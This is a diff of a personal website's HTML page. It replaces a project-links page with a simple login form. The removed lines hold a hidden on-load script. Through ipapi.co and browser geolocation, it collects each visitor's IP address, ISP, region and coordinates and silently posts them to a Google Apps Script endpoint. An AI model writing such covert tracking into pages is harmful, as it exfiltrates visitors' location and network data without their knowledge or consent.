@@ -1,159 +1,43 @@
 <!DOCTYPE html>
-
-<html>
+<html lang="en">
 <head>
-  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8" >
-  <title>Hello, World!</title>
-  <link rel="stylesheet" href="this.css">
-  <script src = "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-  
-    </script>
-  <link rel="stylesheet" href="https://pyscript.net/releases/2024.10.1/core.css">
-
-<script type="module" src="https://pyscript.net/releases/2024.10.1/core.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="sign.css" rel="stylesheet">
 </head>
 <body>
-  <h1>Projects
-  </h1> 
+    <div class="container">
+        <div class="language-selector">
+            <label for="language">English (In)</label>
+        </div>
 
-  <br>
-  <a id="calculator" href="nmk.html">•Calculator</a>
-  <br> <br>
-  <a id="weather" href="weather.html">•Weather</a>
-  <br><br>
-  <a id="log" href="sign.html">•Login</a>
-  <br><br>
-  <a id="dowry" href="vinay.html">•Dowry</a>
-  <br><br>
-  <a  id="cid" href="https://sumitch77.github.io/cid/">•CID</a>
-    <br><br>
-  <a id="tourism" href="https://sumitch77.github.io/Tourism-/">•Tourism</a>
-   <br><br>
-  <a id="polity" href="https://sumitch77.github.io/Polity/">•Political Songs</a>
-   <br><br>
-  <a href="finalp.pdf" download>click</a>
-  <a href="coa.pdf" download>clocm</a>
-  
-  <br><br>
-  <py-script src="sumit.py"/></py-script>
-<input type="number" placeholder="enter row" id="hrow">
-<input type="number" placeholder="enter row" id="hcol">
-<button id="but5" type="button">Click</button>
+        <div class="login-box">
+          
+            <form id="form">
+                <div class="input-group">
+                    <div id="wrong"> Invalid Username , Create New Account</div>
+                    <br>
+                    <input type="text" id="username" name="username" placeholder="Username">
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Password">
+                </div>
+                
+                <button type="button" id="login" class="login-btn">Log in</button>
+            </form>
+         
+         
+        </div>
 
-<div id="mat" ></div>
-  <footer> 
-    <h2>Follow us on</h2>
-    
-    <div id="fot">
-  <a href="https://www.instagram.com/sumit_ch_77?igsh=b2Y1ZndpeXkxemRo"><img id="insta" src="ins.jpg" alt="instagram logo"></a>
-  <br>
-  <a href="https://www.facebook.com/profile.php?id=61560632547412&mibextid=ZbWKwL"><img id="face"  src="faceb.png" alt="facebook logo"></a>
-  <br>
-    <a href="https://x.com/SumitCH7728?t=886Cggc9YJlhD0sQf6oHeA&s=09"><img id="twit"  src="xt.jpg" alt="facebook logo"></a>
-    <br>
-  <a href="https://www.chess.com/member/nobody7728"><img id="face"  src="ches.jpg" alt="facebook logo"></a>
-  
-      
+        <br>
+        <br>
+        <br>
+
+        <button id="create" class="create-account-btn">Create new account</button>
     </div>
-    <br><br>
-    <div id="no">
-  BGMI ID - GodSumit
-    <br><br>
-  COC tag - PCG9CCYUC
-  <br>
-    </div>  
-    </footer>
-  
-
-<script>
-let ro1 = document.querySelector("#hrow");
-let co1 = document.querySelector("#hcol");
-let but5 = document.querySelector("#but5");
-let mat = document.querySelector("#mat");
-
-but5.addEventListener("click",()=>{
-  
-  let rowval = ro1.value;
-  let colval = co1.value;
-  
-});
-
-</script>
-
-
-  <script>
-
-  function getLocation() {
-                    
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(function (position) {
-                            var lat = position.coords.latitude;
-                            var lon = position.coords.longitude;
-                            let gta = lat.toFixed(5) +","+ lon.toFixed(5);
-                            let data = gta;
-                            fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
-                              
-               method: "POST",
-              mode: "no-cors",   
-    headers: { "Content-Type": "text/plain" },
-    body: JSON.stringify(data)
-  })
-  .then(res => res.text())
-  .then(response => {
-    console.log("shared");
-        
-        
-        
-  })
-  .catch(err => console.error(err));
-  
-                            var mapLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                        }, function (error) {
-                            console.log("504");
-                        });
-                    } else {
-                        console.log("502");
-                    }
-                }
-                 
-  function hac() {
-  $.getJSON('https://ipapi.co/json/', function(data){
-       
-       let ip = data.ip;
-       let isp = data.org;
-       let state = data.region;
-       let country = data.country_name;
-       let lat = data.latitude;
-       let long = data.longitude;
-       datu = {
-           ip,
-           isp,
-           state,
-           country,
-           lat,
-           long
-       }
-fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
-                                  
-               method: "POST",
-              mode: "no-cors",   
-    headers: { "Content-Type": "text/plain" },
-    body: JSON.stringify(datu)
-  })
-  .then(res => res.text())
-  .then(response => {
-    console.log("shared");
-        
-        
-        
-  })
-  .catch(err => console.error(err));
-  
-   })
-  }
-  
-  hac();
-  getLocation();
-  </script>
+  <script src="sign.js"></script>
 </body>
 </html>
